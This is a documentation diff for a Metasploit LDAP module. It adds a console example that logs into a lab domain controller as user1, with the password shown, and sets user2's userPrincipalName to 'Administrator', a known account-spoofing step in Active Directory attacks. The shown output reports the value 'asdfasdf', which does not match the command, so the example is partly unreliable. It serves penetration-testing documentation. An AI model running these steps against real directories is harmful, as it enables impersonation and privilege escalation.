@@ -131,6 +131,37 @@ msf6 auxiliary(gather/ldap_object) > run
 [*] Auxiliary module execution completed
 ```
 
+### Action `Create` 
+```
+msf6 auxiliary(gather/ldap_object) > set action create
+action => create
+msf6 auxiliary(gather/ldap_object) > set rhost 172.16.199.200
+rhost => 172.16.199.200
+msf6 auxiliary(gather/ldap_object) > set LDAPDomain kerberos.issue
+LDAPDomain => kerberos.issue
+msf6 auxiliary(gather/ldap_object) > set LDAPUsername user1
+LDAPUsername => user1
+msf6 auxiliary(gather/ldap_object) > set LDAPPassword N0tpassword!
+LDAPPassword => N0tpassword!
+msf6 auxiliary(gather/ldap_object) > set OBJECT user2
+OBJECT => user2
+msf6 auxiliary(gather/ldap_object) > set OBJECT_LOOKUP sAMAccountName
+OBJECT_LOOKUP => sAMAccountName
+msf6 auxiliary(gather/ldap_object) > set ATTRIBUTE userPrincipalName
+ATTRIBUTE => userPrincipalName
+msf6 auxiliary(gather/ldap_object) > set VALUE Administrator
+VALUE => Administrator
+msf6 auxiliary(gather/ldap_object) > run
+[*] Reloading module...
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Running module against 172.16.199.200
+[*] Discovering base DN automatically
+[*] Attempting to add attribute userPrincipalName with value asdfasdf to CN=user2,CN=Users,DC=kerberos,DC=issue...
+[+] Successfully added attribute userPrincipalName with value asdfasdf to CN=user2,CN=Users,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+```
+
 ## Notes
 
 - Ensure the user account used for authentication has sufficient privileges to modify the specified attribute.
